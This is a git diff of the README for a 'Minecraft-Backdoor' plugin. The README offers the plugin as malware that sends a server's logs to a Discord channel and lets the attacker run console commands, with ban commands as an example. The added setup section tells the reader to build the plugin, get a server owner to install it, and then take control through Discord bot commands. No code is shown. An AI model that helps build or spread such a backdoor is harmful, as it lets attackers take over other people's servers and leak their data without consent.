@@ -1,11 +1,20 @@
 # Minecraft-Backdoor
 Made by KuzeySRC (15w30x)
 
+Requirements:
+Apache Maven 3.9.9/4.0.0
+Java 16
+
+
 Features:
 
 You can transfer the logs from the server where Backdoor is installed to the discord channel. (!logekle)
 
 You can use commands as Server. (!konsolekle)
+
+How to Setup the console:
+
+Build the plugin and make a server owner installs this plugin to his server. After that if he installed this plugin on to his server the bot will activated. Then just type "!konsolekle (channel id)" or "!logekle (channel id)"
 
 Example: ban 15w30x
 
